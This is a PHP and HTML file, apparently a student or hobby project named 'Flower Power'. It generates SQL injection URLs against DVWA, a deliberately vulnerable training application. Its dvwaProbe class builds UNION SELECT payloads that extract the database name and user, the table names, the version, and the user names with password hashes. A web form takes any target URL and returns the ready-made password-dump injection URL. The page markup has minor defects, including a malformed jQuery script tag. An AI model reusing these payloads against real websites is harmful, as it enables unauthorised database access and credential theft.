<?php

class dvwaProbe
{
	protected $url;

	public function __construct($url)
	{
		$this->url = $url;
	}
	
	/**
 	 * Constant variable for SQL injection
 	 *
 	 * @return string
 	 */
	 
	public function inject()
	{
		$insert = "?id=1%27 and 1%3d1 ";
		return $insert;
	}
	
	/**
 	 * Gets database and user
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getDatabase()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select database%28%29%2c user%28%29%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets tables
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getTable()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select null%2c table_name from information_schema.tables%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets users with hashed passwords
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getPassword()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select user%2c password from users%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets version of OS
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getVersion()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select null%2c version%28%29%23&Submit=Submit#";
		return $injectURL;
	}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Flower Power </title>
	<meta name="description" content="Flowerpower">
	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
	<!-- Optional theme -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css.css">
</head>
<body>
	<nav class="navbar navbar-inverse navbar-fixed-top">
		<div class="container">
			<div class="navbar-header">
			<a href="" class="navbar-brand">Flowerpower</a>
			<ul class="nav navbar-nav">
				<li><a href="placerholder">placerholder</a>
			</ul>
		</div>
	</nav>
	<div class="jumbotron">
		<div class="container text-center">
			<h1>Flower Power</h1>
			<?php if ($_POST): ?>
                <?php 
                    $url = $_POST["url"];
                    $dvwaProbe = new dvwaProbe($url);
                    echo $dvwaProbe->getPassword();                            
                ?>
            <?php else: ?>
                <form method="POST" action="">
                    <div>
                        <input type="text" placeholder="Website URL" class="" name="url">
                    </div>
                    <div>
                        <button type="submit" class="btn btn-lg btn-warning"> Submit</button>
                    </div>
                </form>
            <?php endif; ?>
		</div>
        
	</div>
	<script src=""http://code.jquery.com/jquery-2.2.1.min.js"">
	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
</body>
</html>	